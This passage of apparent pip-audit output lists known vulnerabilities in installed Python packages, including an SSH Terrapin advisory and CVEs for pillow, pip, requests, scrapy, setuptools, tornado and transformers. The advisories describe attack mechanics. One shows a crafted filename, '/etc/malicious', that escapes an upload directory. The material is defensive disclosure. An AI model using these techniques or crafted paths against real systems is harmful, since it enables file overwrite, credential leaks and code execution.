Terrapin is a prefix truncation attack targeting the SSH protocol. More precisely, Terrapin breaks the integrity of SSH's secure channel. By carefully adjusting the sequence numbers during the handshake, an attacker can remove an arbitrary amount of messages sent by the client or server at the beginning of the secure channel without the client or server noticing it.  ### Mitigations  To mitigate this protocol vulnerability, OpenSSH suggested a so-called \"strict kex\" which alters the SSH handshake to ensure a Man-in-the-Middle attacker cannot introduce unauthenticated messages as well as convey sequence number manipulation across handshakes.  **Warning: To take effect, both the client and server must support this countermeasure.**   As a stop-gap measure, peers may also (temporarily) disable the affected algorithms and use unaffected alternatives like AES-GCM instead until patches are available.  ### Details  The SSH specifications of ChaCha20-Poly1305 (chacha20-poly1305@openssh.com) and Encrypt-then-MAC (*-etm@openssh.com MACs) are vulnerable against an arbitrary prefix truncation attack (a.k.a. Terrapin attack). This allows for an extension negotiation downgrade by stripping the SSH_MSG_EXT_INFO sent after the first message after SSH_MSG_NEWKEYS, downgrading security, and disabling attack countermeasures in some versions of OpenSSH. When targeting Encrypt-then-MAC, this attack requires the use of a CBC cipher to be practically exploitable due to the internal workings of the cipher mode. Additionally, this novel attack technique can be used to exploit previously unexploitable implementation flaws in a Man-in-the-Middle scenario.  The attack works by an attacker injecting an arbitrary number of SSH_MSG_IGNORE messages during the initial key exchange and consequently removing the same number of messages just after the initial key exchange has concluded. This is possible due to missing authentication of the excess SSH_MSG_IGNORE messages and the fact that the implicit sequence numbers used within the SSH protocol are only checked after the initial key exchange.  In the case of ChaCha20-Poly1305, the attack is guaranteed to work on every connection as this cipher does not maintain an internal state other than the message's sequence number. In the case of Encrypt-Then-MAC, practical exploitation requires the use of a CBC cipher; while theoretical integrity is broken for all ciphers when using this mode, message processing will fail at the application layer for CTR and stream ciphers.  For more details see [https://terrapin-attack.com](https://terrapin-attack.com).   ### Impact  This attack targets the specification of ChaCha20-Poly1305 (chacha20-poly1305@openssh.com) and Encrypt-then-MAC (*-etm@openssh.com), which are widely adopted by well-known SSH implementations and can be considered de-facto standard. These algorithms can be practically exploited; however, in the case of Encrypt-Then-MAC, we additionally require the use of a CBC cipher. As a consequence, this attack works against all well-behaving SSH implementations supporting either of those algorithms and can be used to downgrade (but not fully strip) connection security in case SSH extension negotiation (RFC8308) is supported. The attack may also enable attackers to exploit certain implementation flaws in a man-in-the-middle (MitM) scenario."}]}, {"name": "parsel", "version": "1.8.1", "vulns": []}, {"name": "parso", "version": "0.8.3", "vulns": []}, {"name": "partd", "version": "1.4.1", "vulns": []}, {"name": "pathspec", "version": "0.10.3", "vulns": []}, {"name": "patsy", "version": "0.5.6", "vulns": []}, {"name": "pdfminer-six", "version": "20251230", "vulns": []}, {"name": "pdfplumber", "version": "0.11.9", "vulns": []}, {"name": "pefile", "version": "2024.8.26", "vulns": []}, {"name": "pexpect", "version": "4.8.0", "vulns": []}, {"name": "pickleshare", "version": "0.7.5", "vulns": []}, {"name": "pillow", "version": "10.4.0", "vulns": [{"id": "CVE-2026-25990", "fix_versions": ["12.1.1"], "aliases": ["BIT-pillow-2026-25990", "GHSA-cfh3-3jmp-rvhc"], "description": "### Impact An out-of-bounds write may be triggered when loading a specially crafted PSD image. Pillow >= 10.3.0 users are affected.  ### Patches Pillow 12.1.1 will be released shortly with a fix for this.  ### Workarounds `Image.open()` has a `formats` parameter that can be used to prevent PSD images from being opened.  ### References Pillow 12.1.1 will add release notes at https://pillow.readthedocs.io/en/stable/releasenotes/index.html"}]}, {"name": "pip", "version": "24.2", "vulns": [{"id": "CVE-2025-8869", "fix_versions": ["25.3"], "aliases": ["GHSA-4xh5-x5gv-qwph", "BIT-pip-2025-8869"], "description": "When extracting a tar archive pip may not check symbolic links point into the extraction directory if the tarfile module doesn't implement PEP 706. Note that upgrading pip to a \"fixed\" version for this vulnerability doesn't fix all known vulnerabilities that are remediated by using a Python version that implements PEP 706. Note that this is a vulnerability in pip's fallback implementation of tar extraction for Python versions that don't implement PEP 706 and therefore are not secure to all vulnerabilities in the Python 'tarfile' module. If you're using a Python version that implements PEP 706 then pip doesn't use the \"vulnerable\" fallback code. Mitigations include upgrading to a version of pip that includes the fix, upgrading to a Python version that implements PEP 706 (Python >=3.9.17, >=3.10.12, >=3.11.4, or >=3.12), applying the linked patch, or inspecting source distributions (sdists) before installation as is already a best-practice."}, {"id": "CVE-2026-1703", "fix_versions": ["26.0"], "aliases": ["BIT-pip-2026-1703", "GHSA-6vgw-5pg2-w6jp"], "description": "When pip is installing and extracting a maliciously crafted wheel archive, files may be extracted outside the installation directory. The path traversal is limited to prefixes of the installation directory, thus isn't able to inject or overwrite executable files in typical situations."}]}, {"name": "pip-api", "version": "0.0.34", "vulns": []}, {"name": "pip-audit", "version": "2.10.0", "vulns": []}, {"name": "pip-requirements-parser", "version": "32.0.1", "vulns": []}, {"name": "pkce", "version": "1.0.3", "vulns": []}, {"name": "pkginfo", "version": "1.10.0", "vulns": []}, {"name": "platformdirs", "version": "4.9.2", "vulns": []}, {"name": "plotly", "version": "5.24.1", "vulns": []}, {"name": "pluggy", "version": "1.6.0", "vulns": []}, {"name": "ply", "version": "3.11", "vulns": []}, {"name": "pooch", "version": "1.9.0", "vulns": []}, {"name": "pre-commit", "version": "4.5.1", "vulns": []}, {"name": "preshed", "version": "3.0.9", "vulns": []}, {"name": "prometheus-client", "version": "0.14.1", "vulns": []}, {"name": "prompt-toolkit", "version": "3.0.43", "vulns": []}, {"name": "protego", "version": "0.1.16", "vulns": []}, {"name": "protobuf", "version": "4.25.8", "vulns": [{"id": "CVE-2026-0994", "fix_versions": ["5.29.6", "6.33.5"], "aliases": ["GHSA-7gcm-g887-7qv7"], "description": "A denial-of-service (DoS) vulnerability exists in google.protobuf.json_format.ParseDict() in Python, where the max_recursion_depth limit can be bypassed when parsing nested google.protobuf.Any messages.  Due to missing recursion depth accounting inside the internal Any-handling logic, an attacker can supply deeply nested Any structures that bypass the intended recursion limit, eventually exhausting Python\u2019s recursion stack and causing a RecursionError."}]}, {"name": "psutil", "version": "5.9.0", "vulns": []}, {"name": "ptyprocess", "version": "0.7.0", "vulns": []}, {"name": "pure-eval", "version": "0.2.2", "vulns": []}, {"name": "py-cpuinfo", "version": "9.0.0", "vulns": []}, {"name": "py-serializable", "version": "2.1.0", "vulns": []}, {"name": "pyarrow", "version": "19.0.0", "vulns": []}, {"name": "pyasn1", "version": "0.4.8", "vulns": []}, {"name": "pyasn1-modules", "version": "0.2.8", "vulns": []}, {"name": "pycodestyle", "version": "2.11.1", "vulns": []}, {"name": "pycosat", "version": "0.6.6", "vulns": []}, {"name": "pycparser", "version": "2.21", "vulns": []}, {"name": "pyct", "version": "0.5.0", "vulns": []}, {"name": "pycurl", "version": "7.45.3", "vulns": []}, {"name": "pydantic", "version": "2.12.5", "vulns": []}, {"name": "pydantic-core", "version": "2.41.5", "vulns": []}, {"name": "pydeck", "version": "0.8.0", "vulns": []}, {"name": "pydispatcher", "version": "2.0.5", "vulns": []}, {"name": "pydocstyle", "version": "6.3.0", "vulns": []}, {"name": "pydyf", "version": "0.12.1", "vulns": []}, {"name": "pyerfa", "version": "2.0.1.4", "vulns": []}, {"name": "pyflakes", "version": "3.2.0", "vulns": []}, {"name": "pygments", "version": "2.15.1", "vulns": []}, {"name": "pyinstaller", "version": "6.18.0", "vulns": []}, {"name": "pyinstaller-hooks-contrib", "version": "2025.11", "vulns": []}, {"name": "pyjwt", "version": "2.8.0", "vulns": []}, {"name": "pylint", "version": "2.16.2", "vulns": []}, {"name": "pylint-venv", "version": "3.0.3", "vulns": []}, {"name": "pyls-spyder", "version": "0.4.0", "vulns": []}, {"name": "pymupdf", "version": "1.26.7", "vulns": []}, {"name": "pynacl", "version": "1.5.0", "vulns": [{"id": "CVE-2025-69277", "fix_versions": ["1.6.2"], "aliases": ["GHSA-mrfv-m5wm-5w6w"], "description": "libsodium before ad3004e, in atypical use cases involving certain custom cryptography or untrusted data to crypto_core_ed25519_is_valid_point, mishandles checks for whether an elliptic curve point is valid because it sometimes allows points that aren't in the main cryptographic group.  This advisoory lists packages in the GitHub Advisory Database's [supported ecosystems](https://github.com/github/advisory-database?tab=readme-ov-file#supported-ecosystems) that are affected by this vulnerability due to a vulnerable dependency."}]}, {"name": "pyodbc", "version": "5.1.0", "vulns": []}, {"name": "pyopenssl", "version": "24.2.1", "vulns": []}, {"name": "pyparsing", "version": "3.1.2", "vulns": []}, {"name": "pypdf2", "version": "3.0.1", "vulns": []}, {"name": "pypdfium2", "version": "5.3.0", "vulns": []}, {"name": "pyphen", "version": "0.17.2", "vulns": []}, {"name": "pyqt5", "version": "5.15.10", "vulns": []}, {"name": "pyqt5-sip", "version": "12.13.0", "vulns": []}, {"name": "pyqtwebengine", "version": "5.15.6", "vulns": []}, {"name": "pysocks", "version": "1.7.1", "vulns": []}, {"name": "pyspellchecker", "version": "0.8.4", "vulns": []}, {"name": "pytest", "version": "9.0.2", "vulns": []}, {"name": "pytest-cov", "version": "7.0.0", "vulns": []}, {"name": "pytest-mock", "version": "3.15.1", "vulns": []}, {"name": "pytest-xdist", "version": "3.6.1", "vulns": []}, {"name": "python-dateutil", "version": "2.9.0.post0", "vulns": []}, {"name": "python-docx", "version": "1.2.0", "vulns": []}, {"name": "python-dotenv", "version": "0.21.0", "vulns": []}, {"name": "python-json-logger", "version": "2.0.7", "vulns": []}, {"name": "python-lsp-black", "version": "2.0.0", "vulns": []}, {"name": "python-lsp-jsonrpc", "version": "1.1.2", "vulns": []}, {"name": "python-lsp-server", "version": "1.10.0", "vulns": []}, {"name": "python-multipart", "version": "0.0.9", "vulns": [{"id": "CVE-2024-53981", "fix_versions": ["0.0.18"], "aliases": ["GHSA-59g5-xgcq-4qw3"], "description": "### Summary  When parsing form data, `python-multipart` skips line breaks (CR `\\r` or LF `\\n`) in front of the first boundary and any tailing bytes after the last boundary. This happens one byte at a time and emits a log event each time, which may cause excessive logging for certain inputs.  An attacker could abuse this by sending a malicious request with lots of data before the first or after the last boundary, causing high CPU load and stalling the processing thread for a significant amount of time. In case of ASGI application, this could stall the event loop and prevent other requests from being processed, resulting in a denial of service (DoS).  ### Impact  Applications that use `python-multipart` to parse form data (or use frameworks that do so) are affected.   ### Original Report  This security issue was reported by: - GitHub security advisory in Starlette on October 30 by @Startr4ck - Email to `python-multipart` maintainer on October 3 by @mnqazi"}, {"id": "CVE-2026-24486", "fix_versions": ["0.0.22"], "aliases": ["GHSA-wp53-j4wj-2cfg"], "description": "### Summary  A Path Traversal vulnerability exists when using non-default configuration options `UPLOAD_DIR` and `UPLOAD_KEEP_FILENAME=True`. An attacker can write uploaded files to arbitrary locations on the filesystem by crafting a malicious filename.  ### Details  When `UPLOAD_DIR` is set and `UPLOAD_KEEP_FILENAME` is `True`, the library constructs the file path using `os.path.join(file_dir, fname)`. Due to the behavior of `os.path.join()`, if the filename begins with a `/`, all preceding path components are discarded:  ```py os.path.join(\"/upload/dir\", \"/etc/malicious\") == \"/etc/malicious\" ```                          This allows an attacker to bypass the intended upload directory and write files to arbitrary paths.                                                                                                                                                                                         #### Affected Configuration                                                                                                                                                                                                                                                                      Projects are only affected if all of the following are true:                                                                                      - `UPLOAD_DIR` is set - `UPLOAD_KEEP_FILENAME` is set to True - The uploaded file exceeds `MAX_MEMORY_FILE_SIZE` (triggering a flush to disk)  The default configuration is not vulnerable.                                                                                                                                                                                                                                                #### Impact                                                                                                                                                                                                                                                                                   Arbitrary file write to attacker-controlled paths on the filesystem.                                                                                                                                                                                                                        #### Mitigation                                                                                                                                                                                                                                                                                  Upgrade to version 0.0.22, or avoid using `UPLOAD_KEEP_FILENAME=True` in project configurations."}]}, {"name": "python-slugify", "version": "5.0.2", "vulns": []}, {"name": "pytoolconfig", "version": "1.2.6", "vulns": []}, {"name": "pytz", "version": "2024.1", "vulns": []}, {"name": "pyviz-comms", "version": "3.0.2", "vulns": []}, {"name": "pywavelets", "version": "1.7.0", "vulns": []}, {"name": "pywin32", "skip_reason": "Dependency not found on PyPI and could not be audited: pywin32 (305.1)"}, {"name": "pywin32-ctypes", "version": "0.2.2", "vulns": []}, {"name": "pywinpty", "version": "2.0.10", "vulns": []}, {"name": "pyyaml", "version": "6.0.1", "vulns": []}, {"name": "pyzmq", "version": "25.1.2", "vulns": []}, {"name": "qdarkstyle", "version": "3.2.3", "vulns": []}, {"name": "qstylizer", "version": "0.2.2", "vulns": []}, {"name": "qtawesome", "version": "1.3.1", "vulns": []}, {"name": "qtconsole", "version": "5.5.1", "vulns": []}, {"name": "qtpy", "version": "2.4.1", "vulns": []}, {"name": "queuelib", "version": "1.6.2", "vulns": []}, {"name": "referencing", "version": "0.30.2", "vulns": []}, {"name": "regex", "version": "2026.1.15", "vulns": []}, {"name": "reportlab", "version": "4.4.7", "vulns": []}, {"name": "requests", "version": "2.32.3", "vulns": [{"id": "CVE-2024-47081", "fix_versions": ["2.32.4"], "aliases": ["GHSA-9hjg-9r4m-mvj7"], "description": "### Impact  Due to a URL parsing issue, Requests releases prior to 2.32.4 may leak .netrc credentials to third parties for specific maliciously-crafted URLs.  ### Workarounds For older versions of Requests, use of the .netrc file can be disabled with `trust_env=False` on your Requests Session ([docs](https://requests.readthedocs.io/en/latest/api/#requests.Session.trust_env)).  ### References https://github.com/psf/requests/pull/6965 https://seclists.org/fulldisclosure/2025/Jun/2"}]}, {"name": "requests-file", "version": "1.5.1", "vulns": []}, {"name": "requests-toolbelt", "version": "1.0.0", "vulns": []}, {"name": "rfc3339-validator", "version": "0.1.4", "vulns": []}, {"name": "rfc3986-validator", "version": "0.1.1", "vulns": []}, {"name": "rich", "version": "13.7.1", "vulns": []}, {"name": "rope", "version": "1.12.0", "vulns": []}, {"name": "rpds-py", "version": "0.10.6", "vulns": []}, {"name": "rtree", "version": "1.0.1", "vulns": []}, {"name": "ruamel-yaml", "version": "0.18.6", "vulns": []}, {"name": "ruamel-yaml-clib", "version": "0.2.8", "vulns": []}, {"name": "ruamel-yaml-conda", "skip_reason": "Dependency not found on PyPI and could not be audited: ruamel-yaml-conda (0.17.21)"}, {"name": "ruff", "version": "0.14.11", "vulns": []}, {"name": "s3fs", "version": "2024.6.1", "vulns": []}, {"name": "safetensors", "version": "0.7.0", "vulns": []}, {"name": "scikit-image", "version": "0.24.0", "vulns": []}, {"name": "scikit-learn", "version": "1.8.0", "vulns": []}, {"name": "scipy", "version": "1.17.0", "vulns": []}, {"name": "scrapy", "version": "2.11.1", "vulns": [{"id": "PYSEC-2024-258", "fix_versions": ["2.0.0", "2.11.2"], "aliases": ["CVE-2024-1968", "GHSA-4qqq-9vqf-3h3f"], "description": "In scrapy/scrapy, an issue was identified where the Authorization header is not removed during redirects that only change the scheme (e.g., HTTPS to HTTP) but remain within the same domain. This behavior contravenes the Fetch standard, which mandates the removal of Authorization headers in cross-origin requests when the scheme, host, or port changes. Consequently, when a redirect downgrades from HTTPS to HTTP, the Authorization header may be inadvertently exposed in plaintext, leading to potential sensitive information disclosure to unauthorized actors. The flaw is located in the _build_redirect_request function of the redirect middleware."}, {"id": "PYSEC-2017-83", "fix_versions": [], "aliases": ["GHSA-h7wm-ph43-c39p", "CVE-2017-14158"], "description": "Scrapy 1.4 allows remote attackers to cause a denial of service (memory consumption) via large files because arbitrarily many files are read into memory, which is especially problematic if the files are then individually written in a separate thread to a slow storage resource, as demonstrated by interaction between dataReceived (in core/downloader/handlers/http11.py) and S3FilesStore."}, {"id": "GHSA-23j4-mw76-5v7h", "fix_versions": ["2.11.2"], "aliases": [], "description": "### Impact  Scrapy was following redirects regardless of the URL protocol, so redirects were working for `data://`, `file://`, `ftp://`, `s3://`, and any other scheme defined in the `DOWNLOAD_HANDLERS` setting.  However, HTTP redirects should only work between URLs that use the `http://` or `https://` schemes.  A malicious actor, given write access to the start requests (e.g. ability to define `start_urls`) of a spider and read access to the spider output, could exploit this vulnerability to: - Redirect to any local file using the `file://` scheme to read its contents. - Redirect to an `ftp://` URL of a malicious FTP server to obtain the FTP username and password configured in the spider or project. - Redirect to any `s3://` URL to read its content using the S3 credentials configured in the spider or project.  For `file://` and `s3://`, how the spider implements its parsing of input data into an output item determines what data would be vulnerable. A spider that always outputs the entire contents of a response would be completely vulnerable, while a spider that extracted only fragments from the response could significantly limit vulnerable data.  ### Patches  Upgrade to Scrapy 2.11.2.  ### Workarounds  Replace the built-in retry middlewares (`RedirectMiddleware` and `MetaRefreshMiddleware`) with custom ones that implement the fix from Scrapy 2.11.2, and verify that they work as intended.  ### References  This security issue was reported by @mvsantos at https://github.com/scrapy/scrapy/issues/457. "}, {"id": "GHSA-jm3v-qxmh-hxwv", "fix_versions": ["2.11.2"], "aliases": [], "description": "### Impact  When using system proxy settings, which are scheme-specific (i.e. specific to `http://` or `https://` URLs), Scrapy was not accounting for scheme changes during redirects.  For example, an HTTP request would use the proxy configured for HTTP and, when redirected to an HTTPS URL, the new HTTPS request would still use the proxy configured for HTTP instead of switching to the proxy configured for HTTPS. Same the other way around.  If you have different proxy configurations for HTTP and HTTPS in your system for security reasons (e.g., maybe you don\u2019t want one of your proxy providers to be aware of the URLs that you visit with the other one), this would be a security issue.  ### Patches  Upgrade to Scrapy 2.11.2.  ### Workarounds  Replace the built-in retry middlewares (`RedirectMiddleware` and `MetaRefreshMiddleware`) and the `HttpProxyMiddleware` middleware with custom ones that implement the fix from Scrapy 2.11.2, and verify that they work as intended.  ### References  This security issue was reported by @redapple at https://github.com/scrapy/scrapy/issues/767. "}]}, {"name": "seaborn", "version": "0.13.2", "vulns": []}, {"name": "semver", "version": "3.0.2", "vulns": []}, {"name": "send2trash", "version": "1.8.2", "vulns": []}, {"name": "sentence-transformers", "version": "2.7.0", "vulns": []}, {"name": "service-identity", "version": "18.1.0", "vulns": []}, {"name": "setuptools", "version": "78.1.0", "vulns": [{"id": "PYSEC-2025-49", "fix_versions": ["78.1.1"], "aliases": ["BIT-setuptools-2025-47273", "CVE-2025-47273", "GHSA-5rjg-fvgr-3xxf"], "description": "### Summary  A path traversal vulnerability in `PackageIndex` was fixed in setuptools version 78.1.1  ### Details ```     def _download_url(self, url, tmpdir):         # Determine download filename         #         name, _fragment = egg_info_for_url(url)         if name:             while '..' in name:                 name = name.replace('..', '.').replace('\\\\', '_')         else:             name = \"__downloaded__\"  # default if URL has no path contents          if name.endswith('.[egg.zip](http://egg.zip/)'):             name = name[:-4]  # strip the extra .zip before download   -->       filename = os.path.join(tmpdir, name) ```  Here: https://github.com/pypa/setuptools/blob/6ead555c5fb29bc57fe6105b1bffc163f56fd558/setuptools/package_index.py#L810C1-L825C88  `os.path.join()` discards the first argument `tmpdir` if the second begins with a slash or drive letter. `name` is derived from a URL without sufficient sanitization. While there is some attempt to sanitize by replacing instances of '..' with '.', it is insufficient.  ### Risk Assessment As easy_install and package_index are deprecated, the exploitation surface is reduced. However, it seems this could be exploited in a similar fashion like https://github.com/advisories/GHSA-r9hx-vwmv-q579, and as described by POC 4 in https://github.com/advisories/GHSA-cx63-2mw6-8hw5 report: via malicious URLs present on the pages of a package index.  ### Impact An attacker would be allowed to write files to arbitrary locations on the filesystem with the permissions of the process running the Python code, which could escalate to RCE depending on the context.  ### References https://huntr.com/bounties/d6362117-ad57-4e83-951f-b8141c6e7ca5 https://github.com/pypa/setuptools/issues/4946"}, {"id": "PYSEC-2025-49", "fix_versions": ["78.1.1"], "aliases": ["CVE-2025-47273", "GHSA-5rjg-fvgr-3xxf"], "description": "setuptools is a package that allows users to download, build, install, upgrade, and uninstall Python packages. A path traversal vulnerability in `PackageIndex` is present in setuptools prior to version 78.1.1. An attacker would be allowed to write files to arbitrary locations on the filesystem with the permissions of the process running the Python code, which could escalate to remote code execution depending on the context. Version 78.1.1 fixes the issue."}]}, {"name": "shellingham", "version": "1.5.4", "vulns": []}, {"name": "silabeador", "version": "1.2.1", "vulns": []}, {"name": "sip", "version": "6.7.12", "vulns": []}, {"name": "six", "version": "1.16.0", "vulns": []}, {"name": "smart-open", "version": "5.2.1", "vulns": []}, {"name": "smmap", "version": "4.0.0", "vulns": []}, {"name": "sniffio", "version": "1.3.0", "vulns": []}, {"name": "snowballstemmer", "version": "2.2.0", "vulns": []}, {"name": "sortedcontainers", "version": "2.4.0", "vulns": []}, {"name": "soundfile", "version": "0.13.1", "vulns": []}, {"name": "soupsieve", "version": "2.5", "vulns": []}, {"name": "soxr", "version": "1.0.0", "vulns": []}, {"name": "spacy", "version": "3.8.4", "vulns": []}, {"name": "spacy-curated-transformers", "version": "0.3.0", "vulns": []}, {"name": "spacy-legacy", "version": "3.0.12", "vulns": []}, {"name": "spacy-loggers", "version": "1.0.5", "vulns": []}, {"name": "sphinx", "version": "7.3.7", "vulns": []}, {"name": "sphinxcontrib-applehelp", "version": "1.0.2", "vulns": []}, {"name": "sphinxcontrib-devhelp", "version": "1.0.2", "vulns": []}, {"name": "sphinxcontrib-htmlhelp", "version": "2.0.0", "vulns": []}, {"name": "sphinxcontrib-jsmath", "version": "1.0.1", "vulns": []}, {"name": "sphinxcontrib-qthelp", "version": "1.0.3", "vulns": []}, {"name": "sphinxcontrib-serializinghtml", "version": "1.1.10", "vulns": []}, {"name": "spyder", "version": "5.5.1", "vulns": []}, {"name": "spyder-kernels", "version": "2.5.0", "vulns": []}, {"name": "sqlalchemy", "version": "2.0.34", "vulns": []}, {"name": "sqlite-fts4", "version": "1.0.3", "vulns": []}, {"name": "sqlite-utils", "version": "3.39", "vulns": []}, {"name": "srsly", "version": "2.5.1", "vulns": []}, {"name": "stack-data", "version": "0.2.0", "vulns": []}, {"name": "starlette", "version": "0.52.1", "vulns": []}, {"name": "statsmodels", "version": "0.14.2", "vulns": []}, {"name": "streamlit", "version": "1.37.1", "vulns": []}, {"name": "sympy", "version": "1.14.0", "vulns": []}, {"name": "symspellpy", "version": "6.9.0", "vulns": []}, {"name": "syrupy", "version": "5.0.0", "vulns": []}, {"name": "tables", "version": "3.10.1", "vulns": []}, {"name": "tabulate", "version": "0.9.0", "vulns": []}, {"name": "tblib", "version": "1.7.0", "vulns": []}, {"name": "tenacity", "version": "8.2.3", "vulns": []}, {"name": "tensorboard", "version": "2.16.2", "vulns": []}, {"name": "tensorboard-data-server", "version": "0.7.0", "vulns": []}, {"name": "tensorflow", "version": "2.19.0", "vulns": []}, {"name": "tensorflow-cpu", "version": "2.19.1", "vulns": []}, {"name": "termcolor", "version": "3.1.0", "vulns": []}, {"name": "terminado", "version": "0.17.1", "vulns": []}, {"name": "text-unidecode", "version": "1.3", "vulns": []}, {"name": "textdistance", "version": "4.2.1", "vulns": []}, {"name": "thinc", "version": "8.3.4", "vulns": []}, {"name": "threadpoolctl", "version": "3.6.0", "vulns": []}, {"name": "three-merge", "version": "0.1.1", "vulns": []}, {"name": "tifffile", "version": "2023.4.12", "vulns": []}, {"name": "tinycss2", "version": "1.5.1", "vulns": []}, {"name": "tinyhtml5", "version": "2.0.0", "vulns": []}, {"name": "tldextract", "version": "5.1.2", "vulns": []}, {"name": "tokenizers", "version": "0.20.3", "vulns": []}, {"name": "toml", "version": "0.10.2", "vulns": []}, {"name": "tomli", "version": "2.4.0", "vulns": []}, {"name": "tomli-w", "version": "1.2.0", "vulns": []}, {"name": "tomlkit", "version": "0.11.1", "vulns": []}, {"name": "toolz", "version": "0.12.0", "vulns": []}, {"name": "torch", "version": "2.9.1", "vulns": []}, {"name": "tornado", "version": "6.4.1", "vulns": [{"id": "CVE-2025-47287", "fix_versions": ["6.5"], "aliases": ["GHSA-7cx3-6m66-7c5m"], "description": "### Summary  When Tornado's ``multipart/form-data`` parser encounters certain errors, it logs a warning but continues trying to parse the remainder of the data. This allows remote attackers to generate an extremely high volume of logs, constituting a DoS attack. This DoS is compounded by the fact that the logging subsystem is synchronous.  ### Affected versions  All versions of Tornado prior to 6.5 are affected. The vulnerable parser is enabled by default.  ### Solution  Upgrade to Tornado version 6.5. In the meantime, risk can be mitigated by blocking `Content-Type: multipart/form-data` in a proxy."}, {"id": "CVE-2024-52804", "fix_versions": ["6.4.2"], "aliases": ["GHSA-8w49-h785-mj3c"], "description": "The algorithm used for parsing HTTP cookies in Tornado versions prior to 6.4.2 sometimes has quadratic complexity, leading to excessive CPU consumption when parsing maliciously-crafted cookie headers. This parsing occurs in the event loop thread and may block the processing of other requests.  See also CVE-2024-7592 for a similar vulnerability in cpython."}]}, {"name": "tqdm", "version": "4.66.5", "vulns": []}, {"name": "traitlets", "version": "5.14.3", "vulns": []}, {"name": "transformers", "version": "4.45.0", "vulns": [{"id": "PYSEC-2024-227", "fix_versions": ["4.48.0"], "aliases": ["CVE-2024-11392", "GHSA-qxrp-vhvm-j765"], "description": "Hugging Face Transformers MobileViTV2 Deserialization of Untrusted Data Remote Code Execution Vulnerability. This vulnerability allows remote attackers to execute arbitrary code on affected installations of Hugging Face Transformers. User interaction is required to exploit this vulnerability in that the target must visit a malicious page or open a malicious file.  The specific flaw exists within the handling of configuration files. The issue results from the lack of proper validation of user-supplied data, which can result in deserialization of untrusted data. An attacker can leverage this vulnerability to execute code in the context of the current user. Was ZDI-CAN-24322."}, {"id": "PYSEC-2024-229", "fix_versions": ["4.48.0"], "aliases": ["GHSA-hxxf-235m-72v3", "CVE-2024-11394"], "description": "Hugging Face Transformers Trax Model Deserialization of Untrusted Data Remote Code Execution Vulnerability. This vulnerability allows remote attackers to execute arbitrary code on affected installations of Hugging Face Transformers. User interaction is required to exploit this vulnerability in that the target must visit a malicious page or open a malicious file.  The specific flaw exists within the handling of model files. The issue results from the lack of proper validation of user-supplied data, which can result in deserialization of untrusted data. An attacker can leverage this vulnerability to execute code in the context of the current user. Was ZDI-CAN-25012."}, {"id": "PYSEC-2024-228", "fix_versions": ["4.48.0"], "aliases": ["CVE-2024-11393", "GHSA-wrfc-pvp9-mr9g"], "description": "Hugging Face Transformers MaskFormer Model Deserialization of Untrusted Data Remote Code Execution Vulnerability. This vulnerability allows remote attackers to execute arbitrary code on affected installations of Hugging Face Transformers. User interaction is required to exploit this vulnerability in that the target must visit a malicious page or open a malicious file.  The specific flaw exists within the parsing of model files. The issue results from the lack of proper validation of user-supplied data, which can result in deserialization of untrusted data. An attacker can leverage this vulnerability to execute code in the context of the current user. Was ZDI-CAN-25191."}, {"id": "PYSEC-2024-229", "fix_versions": ["4.48.0"], "aliases": ["GHSA-hxxf-235m-72v3", "CVE-2024-11394"], "description": "Hugging Face Transformers Trax Model Deserialization of Untrusted Data Remote Code Execution Vulnerability. This vulnerability allows remote attackers to execute arbitrary code on affected installations of Hugging Face Transformers. User interaction is required to exploit this vulnerability in that the target must visit a malicious page or open a malicious file.  The specific flaw exists within the handling of model files. The issue results from the lack of proper validation of user-supplied data, which can result in deserialization of untrusted data. An attacker can leverage this vulnerability to execute code in the context of the current user. Was ZDI-CAN-25012."}, {"id": "PYSEC-2024-228", "fix_versions": ["4.48.0"], "aliases": ["CVE-2024-11393", "GHSA-wrfc-pvp9-mr9g"], "description": "Hugging Face Transformers MaskFormer Model Deserialization of Untrusted Data Remote Code Execution Vulnerability. This vulnerability allows remote attackers to execute arbitrary code on affected installations of Hugging Face Transformers. User interaction is required to exploit this vulnerability in that the target must visit a malicious page or open a malicious file.  The specific flaw exists within the parsing of model files. The issue results from the lack of proper validation of user-supplied data, which can result in deserialization of untrusted data. An attacker can leverage this vulnerability to execute code in the context of the current user. Was ZDI-CAN-25191."}, {"id": "PYSEC-2024-227", "fix_versions": ["4.48.0"], "aliases": ["CVE-2024-11392", "GHSA-qxrp-vhvm-j765"], "description": "Hugging Face Transformers MobileViTV2 Deserialization of Untrusted Data Remote Code Execution Vulnerability. This vulnerability allows remote attackers to execute arbitrary code on affected installations of Hugging Face Transformers. User interaction is required to exploit this vulnerability in that the target must visit a malicious page or open a malicious file.  The specific flaw exists within the handling of configuration files. The issue results from the lack of proper validation of user-supplied data, which can result in deserialization of untrusted data. An attacker can leverage this vulnerability to execute code in the context of the current user. Was ZDI-CAN-24322."}, {"id": "PYSEC-2025-40", "fix_versions": ["4.49.0"], "aliases": ["CVE-2025-2099", "GHSA-qq3j-4f4f-9583"], "description": "A vulnerability in the `preprocess_string()` function of the `transformers.testing_utils` module in huggingface/transformers version v4.48.3 allows for a Regular Expression Denial of Service (ReDoS) attack. The regular expression used to process code blocks in docstrings contains nested quantifiers, leading to exponential backtracking when processing input with a large number of newline characters. An attacker can exploit this by providing a specially crafted payload, causing high CPU usage and potential application downtime, effectively resulting in a Denial of Service (DoS) scenario."}, {"id": "CVE-2024-12720", "fix_versions": ["4.48.0"], "aliases": ["GHSA-6rvg-6v2m-4j46"], "description": "A Regular Expression Denial of Service (ReDoS) vulnerability was identified in the huggingface/transformers library, specifically in the file tokenization_nougat_fast.py. The vulnerability occurs in the post_process_single() function, where a regular expression processes specially crafted input. The issue stems from the regex exhibiting exponential time complexity under certain conditions, leading to excessive backtracking. This can result in significantly high CPU usage and potential application downtime, effectively creating a Denial of Service (DoS) scenario. The affected version is v4.46.3."}, {"id": "CVE-2025-1194", "fix_versions": ["4.50.0"], "aliases": ["GHSA-fpwr-67px-3qhx"], "description": "A Regular Expression Denial of Service (ReDoS) vulnerability was identified in the huggingface/transformers library, specifically in the file `tokenization_gpt_neox_japanese.py` of the GPT-NeoX-Japanese model. The vulnerability occurs in the SubWordJapaneseTokenizer class, where regular expressions process specially crafted inputs. The issue stems from a regex exhibiting exponential complexity under certain conditions, leading to excessive backtracking. This can result in high CPU usage and potential application downtime, effectively creating a Denial of Service (DoS) scenario. The affected version is v4.48.1 (latest)."}, {"id": "CVE-2025-3263", "fix_versions": ["4.51.0"], "aliases": ["GHSA-q2wp-rjmx-x6x9"], "description": "A Regular Expression Denial of Service (ReDoS) vulnerability was discovered in the Hugging Face Transformers library, specifically in the `get_configuration_file()` function within the `transformers.configuration_utils` module. The affected version is 